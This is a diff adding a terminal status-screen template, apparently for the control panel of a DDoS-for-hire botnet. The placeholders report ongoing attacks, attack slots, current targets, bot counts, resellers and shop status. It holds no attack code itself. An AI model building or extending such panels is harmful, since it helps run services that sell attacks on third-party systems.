@@ -1,0 +1,47 @@
+<<clear()>>
+<<full_screen_custom(90x50)>>
+
+[38;5;45mSYSTEM STATUS[0m
+  ├── [38;5;255mTotal Online Users[0m[38;5;046m: [38;5;255m<<$online>>[0m
+  ├── [38;5;255mTotal Ongoing Attacks[0m[38;5;046m: [38;5;255m<<$all_ongoing>>[0m
+  ├── [38;5;255mAttack Slots Usage[0m[38;5;046m:[38;5;255m
+  │       ├─ [38;5;255mC2[0m[38;5;046m: [38;5;255m<<$all_ongoing_c2>>/<<$max_c2_slots>>[0m
+  │       └─ [38;5;255mAPI[0m[38;5;046m: [38;5;255m<<$all_ongoing_api>>/<<$max_api_slots>>[0m
+  ├── [38;5;255mTotal Attack Count[0m[38;5;046m: [38;5;255m<<$total_attack_logs>>[0m
+  ├── [38;5;255mTop Attack Target Today[0m[38;5;046m: [38;5;255m<<$global_top_target_today>>[0m
+  ├── [38;5;255mGlobal Peak Hour Today[0m[38;5;046m: [38;5;255m<<$attack_peak_hour_today>>[0m
+  ├── [38;5;255mUsers Created By[0m[38;5;046m: [38;5;255m<<$user.created_by>>[0m
+  └── [38;5;255mProjet Name[0m[38;5;046m: [38;5;255m<<$cnc_name>>[0m
+
+[38;5;45mUSER SUMMARY[0m
+  ├── [38;5;255mTotal Users[0m[38;5;046m: [38;5;255m<<$total_users>>[0m
+  ├── [38;5;255mActive Users[0m[38;5;046m: [38;5;255m<<$total_active_users>>[0m
+  ├── [38;5;255mExpired Users[0m[38;5;046m: [38;5;255m<<$total_expired_users>>[0m
+  ├── [38;5;255mNew Users Today[0m[38;5;046m: [38;5;255m<<$global_new_users_today>>[0m
+  ├── [38;5;255mBanned Users[0m[38;5;046m: [38;5;255m<<$global_users_currently_banned>>[0m
+  ├── [38;5;255mActive Resellers[0m[38;5;046m: [38;5;255m<<$global_active_resellers_count>>[0m
+  └── [38;5;255mActive Admins[0m[38;5;046m: [38;5;255m<<$global_active_admin_count>>[0m
+
+[38;5;45mATTACK STATISTICS[0m
+  ├── [38;5;255mOngoing C2 Attacks[0m[38;5;046m: [38;5;255m<<$all_ongoing_c2>>[0m
+  ├── [38;5;255mOngoing API Attacks[0m[38;5;046m: [38;5;255m<<$all_ongoing_api>>[0m
+  ├── [38;5;255mLeast Used Method[0m[38;5;046m: [38;5;255m<<$attack_method_least_used>>[0m
+  ├── [38;5;255mAverage Attack Time[0m[38;5;046m: [38;5;255m<<$global_average_attack_time>>[0m
+  ├── [38;5;255mTotal Attack Uptime[0m[38;5;046m: [38;5;255m<<$total_uptime_attacks>>[0m
+  └── [38;5;255mCurrent Targets Under Attack[0m[38;5;046m: [38;5;255m<<$current_attack_targets>>[0m
+
+[38;5;45mSYSTEM INFOS[0m
+  ├── [38;5;255mApi Status[0m[38;5;046m:[38;5;255m <<$api_status>> [0m
+  ├── [38;5;255mShop Status[0m[38;5;046m:[38;5;255m <<$shop_status>> [0m
+  ├── [38;5;255mMaintenance[0m[38;5;046m:[38;5;255m <<$maintenance_status>> [0m
+  ├── [38;5;255mAttack Status[0m[38;5;046m:[38;5;255m <<$attack_status>> [0m
+  ├── [38;5;255mServers Count[0m[38;5;046m:[38;5;255m <<$servers_count>> [0m
+  ├── [38;5;255mBots Count[0m[38;5;046m:[38;5;255m <<$bots_count>> [0m
+  ├── [38;5;255mServer Uptime[0m[38;5;046m: [38;5;255m<<$uptime_server>>[0m
+  ├── [38;5;255mCPU Usage[0m[38;5;046m: [38;5;255m<<cpu_usage()>>%[0m
+  ├── [38;5;255mMemory Usage[0m[38;5;046m: [38;5;255m<<memory_usage()>>%[0m
+  ├── [38;5;255mDisk Space Used[0m[38;5;046m: [38;5;255m<<disk_space_used()>>[0m
+  ├── [38;5;255mDisk Space Available[0m[38;5;046m: [38;5;255m<<disk_space()>>[0m
+  ├── [38;5;255mKernel Version[0m[38;5;046m: [38;5;255m<<kernel_version()>>[0m
+  └── [38;5;255mOS Version[0m[38;5;046m: [38;5;255m<<os_version()>>[0m
+
